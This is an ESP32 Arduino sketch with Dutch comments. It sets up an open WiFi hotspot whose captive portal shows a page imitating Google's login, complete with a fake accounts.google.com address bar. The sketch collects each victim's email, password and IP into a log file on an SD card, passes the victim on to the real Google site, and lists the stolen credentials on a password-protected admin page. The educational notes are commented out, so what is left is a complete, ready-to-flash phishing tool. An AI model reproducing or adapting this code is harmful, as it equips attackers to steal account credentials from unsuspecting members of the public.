#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <FS.h>
#include <SD.h>
#include <SPI.h>

// WiFi instellingen
const char* ssid = "WiFi";
const char* password = ""; // Open netwerk

// Server en DNS instellingen
WebServer server(80);
DNSServer dnsServer;
IPAddress apIP(192, 168, 4, 1); // Statisch IP voor de captive portal
const byte DNS_PORT = 53;

// SPI pinnen voor SD-kaart - controleer of deze correct zijn voor je ESP32-C3 Super Mini
#define SD_MISO 4
#define SD_CLK  5
#define SD_MOSI 6
#define SD_CS   7

// Statistieken bijhouden
int loginAttempts = 0;

// Redirect naar de phishing pagina voor alle aanvragen
void handleRoot() {
  server.sendHeader("Location", "/welcome", true);
  server.send(302, "text/plain", "");
}

// Welkomstpagina voor de captive portal
void handleWelcome() {
  String html = R"rawliteral(
  <!DOCTYPE html>
  <html lang="nl">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WiFi</title>
    <style>
      body {
        font-family: Arial, sans-serif;
        margin: 0;
        padding: 20px;
        background-color: #f5f5f5;
        text-align: center;
      }
      .container {
        max-width: 500px;
        margin: 50px auto;
        padding: 30px;
        background: white;
        border-radius: 10px;
        box-shadow: 0 2px 10px rgba(0,0,0,0.1);
      }
      h1 {
        color: #4285f4;
      }
      .button {
        background-color: #4285f4;
        color: white;
        border: none;
        padding: 12px 20px;
        border-radius: 5px;
        font-size: 16px;
        cursor: pointer;
        margin-top: 20px;
        text-decoration: none;
        display: inline-block;
      }
      .logo {
        width: 120px;
        height: 120px;
        margin-bottom: 20px;
      }
    </style>
  </head>
  <body>
    <div class="container">
      <h1>WiFi</h1>
      <p>Om toegang te krijgen tot ons gratis WiFi-netwerk, moet je je eerst aanmelden met je Google-account.</p>
      <p>Je krijgt daarna onbeperkt toegang tot het internet.</p>
      <a href="/phish" class="button">Aanmelden met Google</a>
    </div>
  </body>
  </html>
  )rawliteral";
  server.send(200, "text/html", html);
}

// Google phishing login pagina
void handlePhish() {
  String html = R"rawliteral(
  <!DOCTYPE html>
  <html lang="nl">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Inloggen - Google-accounts</title>
    <style>
      * {
        box-sizing: border-box;
        margin: 0;
        padding: 0;
        font-family: 'Google Sans', 'Noto Sans', Roboto, Arial, sans-serif;
      }
      
      body {
        background: #fff;
        color: #202124;
        font-size: 14px;
        height: 100vh;
        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: center;
      }
      
      .url-bar {
        background: #f1f3f4;
        padding: 8px 12px;
        border-radius: 4px;
        margin-bottom: 20px;
        width: 450px;
        text-align: left;
        font-size: 14px;
        color: #5f6368;
      }
      
      .login-container {
        width: 450px;
        padding: 48px 40px 36px;
        border: 1px solid #dadce0;
        border-radius: 8px;
        text-align: center;
      }
      
      .google-logo-svg {
        height: 24px;
        margin-bottom: 24px;
      }
      
      h1 {
        font-size: 24px;
        font-weight: 400;
        margin-bottom: 12px;
      }
      
      .subtitle {
        font-size: 16px;
        font-weight: 400;
        margin-bottom: 32px;
      }
      
      .form-group {
        text-align: left;
        margin-bottom: 24px;
      }
      
      .form-input {
        position: relative;
        margin-top: 24px;
      }
      
      input {
        width: 100%;
        padding: 12px 14px;
        font-size: 16px;
        border: 1px solid #dadce0;
        border-radius: 4px;
        color: #202124;
        height: 56px;
        transition: border 0.2s;
      }
      
      input:focus {
        border: 2px solid #1a73e8;
        outline: none;
      }
      
      input:focus + label, 
      input:not(:placeholder-shown) + label {
        top: -9px;
        left: 12px;
        font-size: 12px;
        background: white;
        padding: 0 4px;
      }
      
      label {
        position: absolute;
        left: 14px;
        top: 16px;
        color: #5f6368;
        pointer-events: none;
        transition: all 0.2s;
      }
      
      .actions {
        display: flex;
        justify-content: space-between;
        margin-top: 32px;
        align-items: center;
      }
      
      .create-account {
        color: #1a73e8;
        font-weight: 500;
        text-decoration: none;
        font-size: 14px;
      }
      
      .create-account:hover {
        text-decoration: underline;
      }
      
      .next-button {
        background-color: #1a73e8;
        color: white;
        border: none;
        border-radius: 4px;
        padding: 10px 24px;
        font-size: 14px;
        font-weight: 500;
        cursor: pointer;
      }
      
      .next-button:hover {
        background-color: #1765cc;
        box-shadow: 0 1px 2px rgba(60, 64, 67, 0.3), 0 1px 3px 1px rgba(60, 64, 67, 0.15);
      }
      
      .forgot-email {
        color: #1a73e8;
        font-weight: 500;
        text-decoration: none;
        font-size: 14px;
        margin-top: 16px;
        display: inline-block;
      }
      
      .forgot-email:hover {
        text-decoration: underline;
      }
      
      .footer {
        display: flex;
        justify-content: space-between;
        width: 450px;
        margin-top: 24px;
        padding: 0 40px;
        color: #5f6368;
        font-size: 12px;
      }
      
      .footer select {
        background: transparent;
        border: none;
        color: #5f6368;
        font-size: 12px;
      }
      
      .footer-links a {
        color: #5f6368;
        text-decoration: none;
        margin-left: 24px;
      }
      
      .footer-links a:hover {
        text-decoration: underline;
      }
      
      .g-logo-color-blue {fill: #4285F4;}
      .g-logo-color-red {fill: #EA4335;}
      .g-logo-color-yellow {fill: #FBBC05;}
      .g-logo-color-green {fill: #34A853;}
    </style>
  </head>
  <body>
    <div class="url-bar">
      <span style="color:green;"></span> accounts.google.com
    </div>
    
    <div class="login-container">
      <h1>Inloggen</h1>
      <p class="subtitle">Ga naar je Google-account</p>
      
      <form action="/login" method="POST">
        <div class="form-group">
          <div class="form-input">
            <input type="email" id="email" name="email" placeholder=" " required>
            <label for="email">E-mailadres of telefoonnummer</label>
          </div>
        </div>
        
        <a href="#" class="forgot-email">E-mailadres vergeten?</a>
        
        <div class="actions">
          <a href="#" class="create-account">Account maken</a>
          <button type="submit" class="next-button">Volgende</button>
        </div>
      </form>
    </div>
    
    <div class="footer">
      <select>
        <option>Nederlands</option>
        <option>English (United States)</option>
        <option>Français</option>
        <option>Deutsch</option>
      </select>
      
      <div class="footer-links">
        <a href="#">Help</a>
        <a href="#">Privacy</a>
        <a href="#">Voorwaarden</a>
      </div>
    </div>
  </body>
  </html>
  )rawliteral";
  server.send(200, "text/html", html);
}

// Verwerk de e-mail invoer en toon het wachtwoordscherm
void handleLogin() {
  String email = server.arg("email");
  
  // Google-stijl wachtwoord pagina met de ingevoerde e-mail
  String html = R"rawliteral(
  <!DOCTYPE html>
  <html lang="nl">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Wachtwoord invoeren - Google-accounts</title>
    <style>
      * {
        box-sizing: border-box;
        margin: 0;
        padding: 0;
        font-family: 'Google Sans', 'Noto Sans', Roboto, Arial, sans-serif;
      }
      
      body {
        background: #fff;
        color: #202124;
        font-size: 14px;
        height: 100vh;
        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: center;
      }
      
      .url-bar {
        background: #f1f3f4;
        padding: 8px 12px;
        border-radius: 4px;
        margin-bottom: 20px;
        width: 450px;
        text-align: left;
        font-size: 14px;
        color: #5f6368;
      }
      
      .login-container {
        width: 450px;
        padding: 48px 40px 36px;
        border: 1px solid #dadce0;
        border-radius: 8px;
        text-align: center;
      }
      
      .google-logo-svg {
        height: 24px;
        margin-bottom: 24px;
      }
      
      h1 {
        font-size: 24px;
        font-weight: 400;
        margin-bottom: 12px;
      }
      
      .subtitle {
        font-size: 16px;
        font-weight: 400;
        margin-bottom: 32px;
      }
      
      .email-display {
        display: flex;
        align-items: center;
        justify-content: center;
        margin-bottom: 32px;
        background-color: #f5f5f5;
        padding: 8px 16px;
        border-radius: 16px;
      }
      
      .email-text {
        margin-right: 8px;
      }
      
      .form-group {
        text-align: left;
        margin-bottom: 24px;
      }
      
      .form-input {
        position: relative;
        margin-top: 24px;
      }
      
      input {
        width: 100%;
        padding: 12px 14px;
        font-size: 16px;
        border: 1px solid #dadce0;
        border-radius: 4px;
        color: #202124;
        height: 56px;
        transition: border 0.2s;
      }
      
      input:focus {
        border: 2px solid #1a73e8;
        outline: none;
      }
      
      input:focus + label, 
      input:not(:placeholder-shown) + label {
        top: -9px;
        left: 12px;
        font-size: 12px;
        background: white;
        padding: 0 4px;
      }
      
      label {
        position: absolute;
        left: 14px;
        top: 16px;
        color: #5f6368;
        pointer-events: none;
        transition: all 0.2s;
      }
      
      .actions {
        display: flex;
        justify-content: space-between;
        margin-top: 32px;
        align-items: center;
      }
      
      .forgot-password {
        color: #1a73e8;
        font-weight: 500;
        text-decoration: none;
        font-size: 14px;
      }
      
      .forgot-password:hover {
        text-decoration: underline;
      }
      
      .next-button {
        background-color: #1a73e8;
        color: white;
        border: none;
        border-radius: 4px;
        padding: 10px 24px;
        font-size: 14px;
        font-weight: 500;
        cursor: pointer;
      }
      
      .next-button:hover {
        background-color: #1765cc;
        box-shadow: 0 1px 2px rgba(60, 64, 67, 0.3), 0 1px 3px 1px rgba(60, 64, 67, 0.15);
      }
      
      .footer {
        display: flex;
        justify-content: space-between;
        width: 450px;
        margin-top: 24px;
        padding: 0 40px;
        color: #5f6368;
        font-size: 12px;
      }
      
      .footer select {
        background: transparent;
        border: none;
        color: #5f6368;
        font-size: 12px;
      }
      
      .footer-links a {
        color: #5f6368;
        text-decoration: none;
        margin-left: 24px;
      }
      
      .footer-links a:hover {
        text-decoration: underline;
      }
      
      .g-logo-color-blue {fill: #4285F4;}
      .g-logo-color-red {fill: #EA4335;}
      .g-logo-color-yellow {fill: #FBBC05;}
      .g-logo-color-green {fill: #34A853;}
    </style>
  </head>
  <body>
    <div class="url-bar">
      <span style="color:green;"></span> accounts.google.com
    </div>
    
    <div class="login-container">
      <h1></h1>
      <div class="email-display">
        <span class="email-text">)rawliteral" + email + R"rawliteral(</span>
        <a href="/phish" style="color: #1a73e8; text-decoration: none;">
          <svg height="18px" width="18px" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="#1a73e8">
            <path d="M3 17.25V21h3.75L17.81 9.94l-3.75-3.75L3 17.25zM20.71 7.04c.39-.39.39-1.02 0-1.41l-2.34-2.34c-.39-.39-1.02-.39-1.41 0l-1.83 1.83 3.75 3.75 1.83-1.83z"/>
          </svg>
        </a>
      </div>
      
      <form action="/submit-password" method="POST">
        <input type="hidden" name="email" value=")rawliteral" + email + R"rawliteral(">
        <div class="form-group">
          <div class="form-input">
            <input type="password" id="password" name="pass" placeholder=" " required>
            <label for="password">Wachtwoord</label>
          </div>
        </div>
        
        <div class="actions">
          <a href="#" class="forgot-password">Wachtwoord vergeten?</a>
          <button type="submit" class="next-button">Volgende</button>
        </div>
      </form>
    </div>
    
    <div class="footer">
      <select>
        <option>Nederlands</option>
        <option>English (United States)</option>
        <option>Français</option>
        <option>Deutsch</option>
      </select>
      
      <div class="footer-links">
        <a href="#">Help</a>
        <a href="#">Privacy</a>
        <a href="#">Voorwaarden</a>
      </div>
    </div>
  </body>
  </html>
  )rawliteral";
  
  server.send(200, "text/html", html);
}

// Verwerk het wachtwoord en sla de volledige inloggegevens op
void handlePasswordSubmit() {
  String email = server.arg("email");
  String pass = server.arg("pass");
  String ip = server.client().remoteIP().toString();
  
  // Tijdsindicatie maken (geen echte timestamp omdat we geen NTP gebruiken)
  String timestamp = String(millis() / 1000); // Seconden sinds start
  
  loginAttempts++;
  
  String logEntry = "Tijd: " + timestamp + " | IP: " + ip + " | Email: " + email + " | Wachtwoord: " + pass + "\n";
  
  Serial.println(" [Phish] " + logEntry);
  
  // Opslaan naar SD-kaart
  File file = SD.open("/log.txt", FILE_APPEND);
  if (file) {
    file.print(logEntry);
    file.close();
    Serial.println(" Gegevens opgeslagen op SD-kaart");
  } else {
    Serial.println(" Kon niet naar SD-kaart schrijven.");
  }
  
  // Redirect naar bedank-pagina en vervolgens naar Google
  String redirectHTML = R"rawliteral(
  <!DOCTYPE html>
  <html>
  <head>
    <meta http-equiv='refresh' content='3;URL=https://www.google.com'>
    <style>
      body { font-family: Arial, sans-serif; text-align: center; padding-top: 50px; }
      .loader { 
        border: 5px solid #f3f3f3;
        border-top: 5px solid #3498db;
        border-radius: 50%;
        width: 50px;
        height: 50px;
        animation: spin 2s linear infinite;
        margin: 20px auto;
      }
      @keyframes spin {
        0% { transform: rotate(0deg); }
        100% { transform: rotate(360deg); }
      }
    </style>
  </head>
  <body>
    <h2>Bedankt voor het inloggen</h2>
    <p>Je krijgt nu toegang tot de WiFi</p>
    <div class="loader"></div>
    <p>Je wordt doorgestuurd...</p>
  </body>
  </html>
  )rawliteral";
  
  server.send(200, "text/html", redirectHTML);
}

// Geef een favicon terug om de pagina legitiemer te laten lijken
void handleFavicon() {
  // Een vereenvoudigde Google favicon
  static const uint8_t favicon[] PROGMEM = {
    0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0x10, 0x10, 0x00, 0x00, 0x01, 0x00,
    0x20, 0x00, 0x68, 0x04, 0x00, 0x00, 0x16, 0x00, 0x00, 0x00, 0x28, 0x00,
    0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x00, 0x01, 0x00,
    0x20, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xFF, 0xFF, 0xFF, 0x00, 0xFF, 0xFF, 0xFF, 0x00, 0xFF, 0xFF, 0xFF, 0x00,
    0xFF, 0xFF, 0xFF, 0x00, 0xFF, 0xFF, 0xFF, 0x00, 0xE7, 0x35, 0x24, 0xFF,
    0xE7, 0x35, 0x24, 0xFF, 0xE7, 0x33, 0x22, 0xFF, 0xE7, 0x35, 0x24, 0xFF,
    0xFF, 0xFF, 0xFF, 0x00, 0xFF, 0xFF, 0xFF, 0x00, 0xFF, 0xFF, 0xFF, 0x00,
    0xFF, 0xFF, 0xFF, 0x00, 0xFF, 0xFF, 0xFF, 0x00, 0xFF, 0xFF, 0xFF, 0x00,
    0xFF, 0xFF, 0xFF, 0x00, 0xFF, 0xFF, 0xFF, 0x00, 0xFF, 0xFF, 0xFF, 0x00,
    0xE7, 0x34, 0x24, 0xFF, 0xE6, 0x32, 0x20, 0xFF, 0xE8, 0x37, 0x27, 0xFF,
    0xF5, 0xC2, 0xBC, 0xFF, 0xF9, 0xE1, 0xDF, 0xFF, 0xF5, 0xC2, 0xBC, 0xFF,
    0xE8, 0x37, 0x27, 0xFF, 0xE6, 0x32, 0x20, 0xFF, 0xE7, 0x34, 0x24, 0xFF,
    0xFF, 0xFF, 0xFF, 0x00, 0xFF, 0xFF, 0xFF, 0x00, 0xFF, 0xFF, 0xFF, 0x00,
    0xFF, 0xFF, 0xFF, 0x00, 0xFF, 0xFF, 0xFF, 0x00, 0xE7, 0x35, 0x24, 0xFF,
    0xE6, 0x32, 0x21, 0xFF, 0xF7, 0xD2, 0xCE, 0xFF, 0xFE, 0xFE, 0xFE, 0xFF,
    0xFE, 0xFD, 0xFD, 0xFF, 0xFE, 0xFE, 0xFE, 0xFF, 0xFE, 0xFD, 0xFD, 0xFF,
    0xFE, 0xFE, 0xFE, 0xFF, 0xF7, 0xD2, 0xCE, 0xFF, 0xE6, 0x32, 0x21, 0xFF,
    0xE7, 0x35, 0x24, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0xFF, 0xFF, 0xFF, 0x00,
    0xFF, 0xFF, 0xFF, 0x00, 0xE7, 0x34, 0x23, 0xFF, 0xE6, 0x31, 0x1F, 0xFF,
    0xF4, 0xBA, 0xB3, 0xFF, 0xFE, 0xFE, 0xFE, 0xFF, 0xFE, 0xFD, 0xFD, 0xFF,
    0xFE, 0xFE, 0xFE, 0xFF, 0xFE, 0xFD, 0xFD, 0xFF, 0xFE, 0xFE, 0xFE, 0xFF,
    0xFE, 0xFD, 0xFD, 0xFF, 0xFE, 0xFE, 0xFE, 0xFF, 0xF4, 0xBA, 0xB3, 0xFF,
    0xE6, 0x31, 0x1F, 0xFF, 0xE7, 0x34, 0x23, 0xFF, 0xFF, 0xFF, 0xFF, 0x00,
    0xE7, 0x34, 0x24, 0xFF, 0xE6, 0x32, 0x21, 0xFF, 0xF8, 0xD9, 0xD6, 0xFF,
    0xFE, 0xFE, 0xFE, 0xFF, 0xFE, 0xFD, 0xFD, 0xFF, 0xFE, 0xFE, 0xFE, 0xFF,
    0xFE, 0xFD, 0xFD, 0xFF, 0xFE, 0xFE, 0xFE, 0xFF, 0xFE, 0xFD, 0xFD, 0xFF,
    0xFE, 0xFE, 0xFE, 0xFF, 0xFE, 0xFD, 0xFD, 0xFF, 0xFE, 0xFE, 0xFE, 0xFF,
    0xF8, 0xD9, 0xD6, 0xFF, 0xE6, 0x32, 0x21, 0xFF, 0xE7, 0x34, 0x24, 0xFF,
    0xE7, 0x34, 0x24, 0xFF, 0xE8, 0x3A, 0x2A, 0xFF, 0xFD, 0xF7, 0xF6, 0xFF,
    0xFE, 0xFD, 0xFD, 0xFF, 0xFE, 0xFE, 0xFE, 0xFF, 0xFE, 0xFD, 0xFD, 0xFF,
    0xFE, 0xFE, 0xFE, 0xFF, 0xFE, 0xFD, 0xFD, 0xFF, 0xFE, 0xFE, 0xFE, 0xFF,
    0xFE, 0xFD, 0xFD, 0xFF, 0xFE, 0xFE, 0xFE, 0xFF, 0xFE, 0xFD, 0xFD, 0xFF,
    0xFD, 0xF7, 0xF6, 0xFF, 0xE8, 0x3A, 0x2A, 0xFF, 0xE7, 0x34, 0x24, 0xFF,
    0xFF, 0xFF, 0xFF, 0xFF
  };
  
  server.send_P(200, "image/x-icon", (const char*)favicon, sizeof(favicon));
}

// Admin pagina om de gelogde inloggegevens te bekijken
void handleSigns() {
  // Basis authenticatie voor de admin pagina
  if (!server.authenticate("admin", "admin123")) {
    server.requestAuthentication();
    return;
  }
  
  String html = "<html><head><title>logs</title>";
  html += "<style>";
  html += "body { font-family: Arial, sans-serif; margin: 20px; }";
  html += "h1 { color: #d93025; }";
  html += "table { border-collapse: collapse; width: 100%; margin-top: 20px; }";
  html += "th, td { text-align: left; padding: 8px; border-bottom: 1px solid #ddd; }";
  html += "th { background-color: #f2f2f2; }";
  html += "tr:hover { background-color: #f5f5f5; }";
  html += ".stats { background: #f1f3f4; padding: 15px; border-radius: 8px; margin-bottom: 20px; }";
  html += "</style></head><body>";
  html += "<h1>Verzamelde Gegevens</h1>";
  
  // Statistieken tonen
  html += "<div class='stats'>";
  html += "<h2>Statistieken</h2>";
  html += "<p><strong>Totaal aantal inlogpogingen:</strong> " + String(loginAttempts) + "</p>";
  html += "<p><strong>ESP32 uptime:</strong> " + String(millis() / 1000) + " seconden</p>";
  html += "</div>";
  
  // SD-kaart checken
  if (!SD.exists("/log.txt")) {
    html += "<p>Geen logbestand gevonden op de SD-kaart.</p>";
    html += "</body></html>";
    server.send(200, "text/html", html);
    return;
  }
  
  // Logbestand uitlezen
  File file = SD.open("/log.txt");
  if (!file) {
    html += "<p>Kon het logbestand niet openen.</p>";
    html += "</body></html>";
    server.send(200, "text/html", html);
    return;
  }
  
  // Tabel met gegevens maken
  html += "<table>";
  html += "<tr><th>Tijd</th><th>IP-adres</th><th>E-mail</th><th>Wachtwoord</th></tr>";
  
  String line;
  while (file.available()) {
    line = file.readStringUntil('\n');
// Parse de log-regel (Tijd: x | IP: x | Email: x | Wachtwoord: x)
    int timePos = line.indexOf("Tijd: ") + 6;
    int timeEnd = line.indexOf(" | IP: ");
    String time = line.substring(timePos, timeEnd);
    
    int ipPos = timeEnd + 6;
    int ipEnd = line.indexOf(" | Email: ");
    String ipAddr = line.substring(ipPos, ipEnd);
    
    int emailPos = ipEnd + 9;
    int emailEnd = line.indexOf(" | Wachtwoord: ");
    String email = line.substring(emailPos, emailEnd);
    
    int passPos = emailEnd + 14;
    String password = line.substring(passPos);
    
    html += "<tr>";
    html += "<td>" + time + "</td>";
    html += "<td>" + ipAddr + "</td>";
    html += "<td>" + email + "</td>";
    html += "<td>" + password + "</td>";
    html += "</tr>";
  }
  
  html += "</table>";
  
  // Instructies voor wissen van logbestand
  html += "<p><a href='/clear' style='color: #d93025;'>Logbestand wissen</a></p>";
  
  // html += "<div class='stats'>";
  // html += "<h2>Educatieve Informatie</h2>";
  // html += "<p>Dit is een demonstratie van een phishing-aanval. In een echte situatie zou je nooit je wachtwoord moeten invullen op een pagina waarnaar je bent doorgestuurd via een open WiFi-netwerk.</p>";
  // html += "<p>Controleer altijd of de URL in de adresbalk correct is (https://accounts.google.com) en of er een gesloten hangslot-icoontje wordt weergegeven.</p>";
  // html += "</div>";
  
  html += "</body></html>";
  file.close();
  
  server.send(200, "text/html", html);
}

// Logbestand wissen
void handleClear() {
  if (!server.authenticate("admin", "admin123")) {
    server.requestAuthentication();
    return;
  }
  
  if (SD.exists("/log.txt")) {
    SD.remove("/log.txt");
    loginAttempts = 0;
  }
  
  server.sendHeader("Location", "/signs", true);
  server.send(302, "text/plain", "");
}

// Stuur elke niet-gedefinieerde URL naar de captive portal
void handleNotFound() {
  server.sendHeader("Location", "/welcome", true);
  server.send(302, "text/plain", "");
}

void setup() {

  Serial.begin(115200);
  // In setup(), voeg deze regels toe:
  server.on("/login", HTTP_POST, handleLogin); // Wijzig bestaande route
  server.on("/submit-password", HTTP_POST, handlePasswordSubmit); // Voeg nieuwe route toe
  
  
  // Status LED instellen (ESP32-C3 Super Mini heeft een RGB LED op GPIO8)
  pinMode(8, OUTPUT);
  digitalWrite(8, HIGH); // LED aan wanneer systeem actief is
  
  // SD-kaart initialiseren
  SPI.begin(SD_CLK, SD_MISO, SD_MOSI, SD_CS);
  if (!SD.begin(SD_CS)) {
    Serial.println("SD-kaart niet gevonden! Log wordt alleen naar Serial geschreven.");
  } else {
    Serial.println("SD-kaart succesvol geïnitialiseerd.");
  }
  
  // Energiebesparing instellen voor langere batterijduur
  WiFi.setSleep(false); // WiFi slaapstand uitschakelen voor betere verbinding
  
  // WiFi access point instellen
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(ssid, password); // Lege password = open netwerk
  Serial.println("📡 Access Point gestart: " + String(ssid));
  Serial.println("IP adres: " + WiFi.softAPIP().toString());
  
  // Signaalsterkte instellen
  WiFi.setTxPower(WIFI_POWER_19_5dBm); // Maximum bereik
  
  // DNS Server starten (captive portal)
  dnsServer.start(DNS_PORT, "*", apIP);
  Serial.println("DNS Server gestart.");
  
  // Webserver routes instellen
  server.on("/", handleRoot);
  server.on("/welcome", handleWelcome);
  server.on("/phish", handlePhish);
  server.on("/login", HTTP_POST, handleLogin);
  server.on("/signs", handleSigns);
  server.on("/clear", handleClear);
  server.on("/favicon.ico", handleFavicon);
  server.onNotFound(handleNotFound);
  
  // Webserver starten
  server.begin();
//  Serial.println("🌐 Webserver gestart.");
//  Serial.println("🚀 Het phishing-demonstratiesysteem is klaar!");
//  Serial.println("ℹ️ Open een webbrowser en verbind met het '" + String(ssid) + "' WiFi-netwerk");
//  Serial.println("ℹ️ Of bezoek http://" + apIP.toString() + " in je browser");
//  Serial.println("⚙️ Admin panel: http://" + apIP.toString() + "/signs (gebruiker: admin, wachtwoord: admin123)");
}

void loop() {
  dnsServer.processNextRequest();
  server.handleClient();
  
  // Knipperende LED indicator wanneer iemand verbonden is
  if (WiFi.softAPgetStationNum() > 0) {
    digitalWrite(8, HIGH);
    delay(300);
    digitalWrite(8, LOW);
    delay(300);
  } else {
    digitalWrite(8, HIGH); // Blijf aan als er niemand verbonden is
  }
}